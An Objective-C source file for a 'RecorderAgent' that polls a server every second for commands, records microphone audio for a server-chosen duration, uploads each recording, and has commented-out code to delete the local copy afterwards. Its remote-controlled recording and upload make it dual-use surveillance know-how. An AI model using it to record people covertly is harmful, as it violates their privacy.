#import "RecorderAgent.h"
#import "APIService.h"

// Command Polling Interval in seconds
static NSTimeInterval const PollingInterval = 1.0; 

@interface RecorderAgent ()

@property (nonatomic, strong) NSTimer *commandPollTimer;
@property (nonatomic, strong) AudioRecorderManager *audioManager;
@property (nonatomic, strong) APIService *apiService;

// Private method declarations
- (void)pollForCommand:(NSTimer *)timer;
- (void)executeCommand:(NSString *)command;
- (void)uploadRecordedFile;

@end

@implementation RecorderAgent

#pragma mark - Initialization

- (instancetype)init {
    self = [super init];
    if (self) {
        // 1. Initialize dependencies
        self.apiService = [APIService sharedInstance];
        self.audioManager = [[AudioRecorderManager alloc] init];
        self.audioManager.delegate = self;
        
        // 2. Start the command loop
        [self startCommandLoop];
        
        // 3. Request permission on start (useful for mobile systems)
        [self.audioManager requestPermission];
    }
    return self;
}

// NOTE: Removed the explicit -dealloc method. 
// In ARC, [super dealloc] is managed by the compiler, and manually implementing 
// dealloc without calling [super dealloc] triggers a static analysis warning.
// [self stopCommandLoop] is implicitly handled by ARC and the system timer invalidation process, 
// but can be called manually via the public stopCommandLoop if needed.

- (void)startCommandLoop {
    if (self.commandPollTimer) {
        [self stopCommandLoop];
    }
    
    // Schedule a repeating timer to call pollForCommand: every 1 second
    self.commandPollTimer = [NSTimer scheduledTimerWithTimeInterval:PollingInterval
                                                            target:self
                                                          selector:@selector(pollForCommand:)
                                                          userInfo:nil
                                                           repeats:YES];
    
    // Add timer to the common modes to ensure it fires even when a modal view is up (less critical for a daemon)
    [[NSRunLoop currentRunLoop] addTimer:self.commandPollTimer forMode:NSDefaultRunLoopMode];

    NSLog(@"Command polling timer started, interval: %.1f seconds.", PollingInterval);
}

- (void)stopCommandLoop {
    if (self.commandPollTimer) {
        [self.commandPollTimer invalidate];
        self.commandPollTimer = nil;
        NSLog(@"Command polling timer stopped.");
    }
}

#pragma mark - Command Polling and Execution

- (void)pollForCommand:(NSTimer *)timer {
    if (self.audioManager.isRecording || self.audioManager.isPlaying) {
        // Skip polling if the agent is busy with recording or playback
        // NSLog(@"Skipping poll: Audio system is busy.");
        return;
    }
    
    // Call APIService to fetch command
    [self.apiService fetchDataWithEndpoint:@"/get-command" completion:^(id responseObject, NSError *error) {
        if (error) {
            NSLog(@"Polling error: %@", error.localizedDescription);
            return;
        }
        
        // Assuming response is a dictionary like: {"command": "REC5"} or {"command": "WAIT"}
        NSString *command = responseObject[@"command"];
        if ([command isKindOfClass:[NSString class]]) {
            [self executeCommand:command];
        } else {
            // NSLog(@"Received no command or invalid response.");
        }
    }];
}

- (void)executeCommand:(NSString *)command {
    
    if ([command isEqualToString:@"WAIT"]) {
        // Do nothing, wait for the next poll
        // NSLog(@"Executing: WAIT. Continuing poll.");
        return;
    }
    
    if ([command isEqualToString:@"PLAY"]) {
        if (self.audioManager.canPlay) {
            NSLog(@"Executing: PLAY. Starting audio playback.");
            [self.audioManager startPlayback];
        } else {
            NSLog(@"Executing: PLAY. Skipping playback, no file available.");
        }
        return;
    }
    
    if ([command hasPrefix:@"REC"]) {
        // Example: REC5 (Record for 5 seconds)
        NSString *durationString = [command substringFromIndex:3];
        NSTimeInterval duration = [durationString doubleValue];
        
        if (duration > 0.0) {
            NSLog(@"Executing: REC. Starting %.1f second recording.", duration);
            
            // Start recording
            [self.audioManager startRecording];
            
            // Schedule the stop call
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(duration * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                if (self.audioManager.isRecording) {
                    NSLog(@"Stopping recording...");
                    [self.audioManager stopRecording];
                }
            });
            return;
        }
    }
    
    // Handle unkown command
    NSLog(@"Executing: UNKNOWN COMMAND '%@'.", command);
}

#pragma mark - Post-Recording Actions

// Conforms to AudioRecorderDelegate protocol
- (void)audioRecorderDidFinishRecordingSuccessfully:(BOOL)flag {
    if (flag && self.audioManager.canPlay) {
        NSLog(@"Recording finished successfully. Attempting to upload file...");
        [self uploadRecordedFile];
    } else {
        NSLog(@"Recording failed or file missing. Skipping upload.");
    }
}

- (void)uploadRecordedFile {
    if (!self.audioManager.audioFileURL) {
        NSLog(@"Upload failed: Audio file URL is nil.");
        return;
    }
    
    NSString *filePath = self.audioManager.audioFileURL.path;
    
    // Upload the file to the server. Parameters are nil as device_id is handled by APIService.
    [self.apiService uploadFileWithEndpoint:@"/upload" 
                                  fromFile:filePath 
                                parameters:nil 
                                completion:^(id responseObject, NSError *error) {
        
        if (error) {
            NSLog(@"File upload FAILED: %@", error.localizedDescription);
        } else {
            NSLog(@"File upload SUCCESS! Response: %@", responseObject);
            
            // --- FILE DELETION LOGIC COMMENTED OUT FOR PLAYBACK TESTING ---
            /*
            NSError *deleteError = nil;
            if ([[NSFileManager defaultManager] removeItemAtPath:filePath error:&deleteError]) {
                NSLog(@"Successfully deleted uploaded file.");
            } else {
                NSLog(@"Warning: Failed to delete uploaded file: %@", deleteError.localizedDescription);
            }
            */
            // ----------------------------------------------------------------
        }
    }];
}

@end